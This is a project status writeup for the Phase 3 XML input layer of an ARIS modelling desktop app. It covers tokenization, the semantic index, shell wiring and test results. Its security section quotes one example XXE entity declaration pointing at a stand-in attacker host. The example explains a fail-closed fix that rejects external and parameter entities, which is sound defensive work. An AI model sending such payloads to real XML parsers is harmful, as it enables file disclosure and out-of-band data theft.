# ARIS Phase 3 input-layer status

Updated 2026-07-29 from `feat/aris-only-studio` at commit `cf13c47217e0b4872b01eeb9fe25b29707cc7a3d`.
Supersedes the "in progress" characterization captured 2026-07-28 (commit `29877ac`/`7744af3`):
Phase 3 completed with commit `a163b38` ("complete Phase 3 lossless AML input layer"). See
[ARIS_PHASE_CHECKLIST.md](/home/ahmed/Desktop/bpmn_tool/desktop/docs/ARIS_PHASE_CHECKLIST.md) for
the phase-status table and vocabulary; this document is the detailed writeup for Phase 3 only.

## What Phase 3 delivers

Four layers, matching plan §6.1:

1. **Immutable raw bytes** — `src/aris/source/sourcePackage.ts` reads exact bytes, strict-decodes
   UTF-8, and computes SHA-256 before any interpretation.
2. **Lossless XML concrete-syntax tree** — `src/aris/source/xmlTokenizer.ts` (in-process) and
   `src/aris/source/browserXmlTokenizer.ts` / `xmlTokenizer.worker.ts` /
   `xmlTokenizerWorkerProtocol.ts` (worker-boundary wrapper) tokenize declaration, encoding,
   DOCTYPE, internal entity declarations, start/end/self-closing tags, attributes (name, value,
   quote style, byte span), text, CDATA, comments, processing instructions, nesting, and
   line/column/byte offsets, with a raw span on every token.
3. **Indexed ARIS semantic source** — `src/aris/source/semanticIndex.ts`
   (`buildSemanticArisDocument`) builds the full `ArisSourceIndex` from plan §6.5: database,
   groups, languages, models, object/connection definitions and occurrences, attributes and
   attribute occurrences, lanes, free text, OLE/attachments, blobs, font style sheets, fonts,
   pens, brushes, template/GUID references, positions, sizes, route points, and unknown
   elements/attributes — this layer did **not** exist in the 2026-07-28 snapshot and is the
   main addition since.
4. **Editable working model and revision commands** — out of scope for Phase 3; that's
   `src/aris/model/**` (Phase 5), not wired to this layer yet.

## Security: the XXE/entity-declaration fix

The previous snapshot of this document described "rejects external entity resolution" as already
true, based on a regex check. That regex had a real, specific bug, now fixed with a hand-written
scanner. From the code comment at `src/aris/source/xmlTokenizer.ts:366-378`:

> This is a hand-written scanner rather than a single regular expression on purpose: a prior
> regex-based implementation only matched the _malformed_ external-entity shape
> `<!ENTITY name SYSTEM>` (missing the mandatory quoted identifier). Real XXE payloads always
> include that identifier — `<!ENTITY xxe SYSTEM "http://attacker.example/evil.dtd">` — which
> the old regex silently failed to match at all, so `matchAll` skipped straight past the
> declaration instead of rejecting it. Any syntax this scanner does not explicitly recognize as
> a safe, bounded, internal-value declaration is rejected (fail closed) rather than silently
> ignored.

In plain terms: the old check looked for the pattern of a _broken_ SYSTEM/PUBLIC declaration
(missing its quoted URI) and would let a well-formed, real XXE payload — the kind an actual
attacker would send — through undetected, because a well-formed declaration never matched the
regex's "malformed" shape in the first place. The replacement (`parseInternalEntities` in
`xmlTokenizer.ts:379-`) walks the internal DOCTYPE subset character by character: it rejects
parameter entities (`<!ENTITY % name ...>`, the primary mechanism behind blind/out-of-band XXE)
outright, rejects any entity whose value is introduced by `SYSTEM` or `PUBLIC` rather than a
quoted literal, and fails closed (throws `XmlTokenizerError` with code `'external-entity'` or
`'malformed-xml'`) on any declaration shape it doesn't explicitly recognize as safe. Verified by
`src/aris/source/xmlTokenizer.test.ts` (36 tests, including the XXE/external-DTD-attempt and
entity-expansion-attack cases from plan §6.6) and re-run clean in this pass.

Numeric character references (`&#1575;`, `&#x627;`) are handled separately and correctly by
`expandEntities` (`xmlTokenizer.ts:662-`) — this matters in practice: the real AnimalWF export's
entire Arabic content — 896 Arabic-range numeric character references, all of them, with zero
exceptions, inside `PlainText TextValue` attributes nested under `StyledElement`/`Paragraph` runs
(60 attributes, 9 distinct strings) — is encoded this way rather than as literal UTF-8 bytes, and
both the tokenizer's entity decoding and the semantic index's `PlainText`-absorption logic
(`semanticIndex.ts` lines ~500–540) decode and surface it correctly. Because every real Arabic
string in this reference file funnels through that one extraction path, a regression there would
silently zero out 100% of the Arabic content available for testing. See the "Arabic content"
blocker in `ARIS_PHASE_CHECKLIST.md` for the full reconciliation (it took two rounds of
correction to get right) — this document is not the place to relitigate that, but it depends on
this decoding path working, and it does.

## Shell integration — the one subsystem that's actually wired in

Unlike every other `src/aris/**` module, this layer is live in the shipped shell.
`src/ArisApp.tsx:33` imports `createArisXmlSourcePackage` from `sourcePackage.ts`, which calls
`buildSemanticArisDocument` internally; `ArisApp.tsx:527` invokes it on file open, and
`ArisApp.tsx:552-585` renders the resulting root element name, XML token/node counts, DOCTYPE
external identifier, and model/object-definition/object-occurrence/connection-definition/
connection-occurrence/attribute/diagnostic/unknown-record counts in the details rail. This is
confirmed by `check:aris-runtime-boundary` (the 69 reachable production modules include this
chain) and by `src/ArisApp.test.tsx`.

What is **not** wired: nothing downstream of the index is reachable. There is no editing, no
canvas, no export, no accounting report screen — those are Phases 4–15's modules, all present on
disk and unit-tested, none reachable from `main.tsx`. See `ARIS_PHASE_CHECKLIST.md` and
`ARIS_PHASE4_TO_15_MODULES.md`.

## Verification, re-run for this update

```text
$ npx vitest run --maxWorkers=2 --retry=0 src/aris/source
✓ src/aris/source/xmlTokenizer.test.ts    (36 tests)
✓ src/aris/source/semanticIndex.test.ts   (19 tests)
Test Files  2 passed | Tests  55 passed

$ npx vitest run --maxWorkers=2 --retry=0 src/ArisApp.test.tsx
✓ src/ArisApp.test.tsx (6 tests)

$ npm run check:aris-runtime-boundary
ARIS runtime boundary check passed: 69 production modules reachable from src/main.tsx.

$ npm run typecheck   # clean
$ npm run lint        # clean
```

Against the real 4,376,152-byte AnimalWF export (`semanticIndex.test.ts`,
`describe('buildSemanticArisDocument')`): 8 models, 279 object definitions, 494 object
occurrences, 465 connection definitions, 465 connection occurrences, 516 attributes, 774
attribute occurrences, 16 lanes, 69 free-text records + 69 free-text occurrences, 14
attachments/OLE occurrences, 28 blobs, 6 font style sheets, 1,339 route points, **0
diagnostics**. Remaining-dimension reconciliation: 1,539 GUID references (858 `GUID` + 494
`ExternalGUID` + 90 `MasterGUID` + 89 `SymbolGUID` + 8 `TemplateGUID`), 8 template references,
1,942 positions, 1,301 sizes, 141 fonts (127 `<Font>` + 12 `<FontNode>` + 2 `<LogFont>`), 494
pens (465 `CxnOcc` + 16 `Lane` + 13 `GfxObj`), 445 brushes (416 `ObjOcc` + 16 `Lane` + 13
`GfxObj`), 7 linked-model assignments, 0 superseded records, **174 unknown records** (13
`GfxObj` + 13 `RoundedRectangle` + 126 `SizeElement` + 19 `Container` + 3 `Union` — all five
element names explicitly enumerated by the test), 0 unknown attributes.

## Current boundary (updated from the 2026-07-28 snapshot)

True as of `cf13c47`:

- exact source bytes are preserved before any interpretation (unchanged from before);
- XML tokenization runs through a browser worker when available (unchanged);
- external entity resolution is rejected by a hand-written scanner, not a regex with a known gap
  (fixed this slice — see above);
- the full semantic ARIS source index (plan §6.4/§6.5) is built and reconciled against the real
  AnimalWF export with zero diagnostics and zero unaccounted lexical elements (new this slice —
  previously listed as "still pending");
- the shell renders semantic-index-derived counts in the details rail (new this slice);
- malformed nesting and duplicate attributes fail closed at the tokenizer boundary (unchanged).

Still pending, unchanged from before:

- integration with immutable source packages and revision history from Phase 4 (that module
  exists, unit-tested, at `src/aris/packages/**`, but is not called from `ArisApp.tsx`);
- any editing surface — Phase 3 is an input layer only, by design (plan §6 is scoped to input).

## Current rolling artifact

- [release/OrbitPM-ARIS-Studio-Lite.html](/home/ahmed/Desktop/bpmn_tool/desktop/release/OrbitPM-ARIS-Studio-Lite.html)
- size: `711,237` bytes
- SHA-256: `04f71213ca5d2ba40eca232231ae0b8d9a84bd16afdff8ba55003f401db8edb3`
- **Stale by two commits**: file mtime (2026-07-29T02:32+04:00) predates commits `2a94175`
  (02:55) and `cf13c47` (02:57), neither of which touches this layer's wiring but both of which
  should be reflected in the next canonical-HTML rebuild per the plan's "every product-code push
  must include the current canonical HTML" rule. Not rebuilt in this pass (`npm run build:aris`
  is out of scope for this documentation task).

## Next implementation slice

Unchanged in direction from before, sharper now that the integration gap is measured precisely:
wire Phase 4's immutable source packages and Phase 5's working-model/command system into
`ArisApp.tsx` so that opening a file produces an editable `ArisWorkingDocument` instead of a
read-only index summary. Everything needed for that — packages, model, writer, accounting — is
already implemented and unit-tested; none of it is called.
